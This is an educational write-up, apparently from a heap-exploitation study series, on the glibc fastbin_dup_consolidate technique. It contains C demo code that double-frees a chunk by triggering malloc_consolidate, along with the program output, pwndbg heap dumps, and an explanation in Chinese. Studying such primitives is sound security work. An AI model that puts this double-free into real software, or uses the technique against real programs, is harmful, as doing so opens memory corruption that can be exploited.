# fastbin_dup_consolidate

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main() {
  void* p1 = malloc(0x40);
  void* p2 = malloc(0x40);
  fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2);
  fprintf(stderr, "Now free p1!\n");
  free(p1);

  void* p3 = malloc(0x400);
  fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
  fprintf(stderr, "In malloc_consolidate(), p1 is moved to the unsorted bin.\n");
  free(p1);
  fprintf(stderr, "Trigger the double free vulnerability!\n");
  fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");
  fprintf(stderr, "Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n", malloc(0x40), malloc(0x40));
}
```
**result**

```c
Allocated two fastbins: p1=0x2439010 p2=0x2439060
Now free p1!
Allocated large bin to trigger malloc_consolidate(): p3=0x24390b0
In malloc_consolidate(), p1 is moved to the unsorted bin.
Trigger the double free vulnerability!
We can pass the check in malloc() since p1 is not fast top.
Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x2439010 0x2439010
```

**analysis**

这个实验展示了另一种绕过double free检查机制的方法。

首先申请了两个fast bin，p1和p2，然后free掉p1。如果我们再free一次p1程序肯定会出错。我们先申请一个large bin，p3。

这里根据malloc的分配规则，此时fast bin中可能合并的chunk被放入了unsorted bin进行分配。所以现在p1已经被放入到了small bin中，而fast bin已经没有了chunk，所以再次free(p1)也没有触发错误。最后我们再取出两个与p1大小相同的chunk，一个是从fast bin中，一个是从small bin中。而且这两个chunk是完全相同的。

**gdb**

申请两个fast bin后堆布局

```c
Allocated chunk | PREV_INUSE
Addr: 0x602000
Size: 0x51

Allocated chunk | PREV_INUSE
Addr: 0x602050
Size: 0x51

Top chunk | PREV_INUSE
Addr: 0x6020a0
Size: 0x20f61
```

free(p1)

```c
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x602000 ◂— 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

malloc(0x400)

```c
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x50: 0x602000 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x602000
largebins
empty
pwndbg> heap
Free chunk (smallbins) | PREV_INUSE
Addr: 0x602000
Size: 0x51
fd: 0x7ffff7dd1bb8
bk: 0x7ffff7dd1bb8

Allocated chunk
Addr: 0x602050
Size: 0x50

Allocated chunk | PREV_INUSE
Addr: 0x6020a0
Size: 0x411

Top chunk | PREV_INUSE
Addr: 0x6024b0
Size: 0x20b51
```

申请large bin时，经过大循环，fast bin中的chunk被放到指定的bins中。fast bin为空，以此绕过fast bin的double free检查。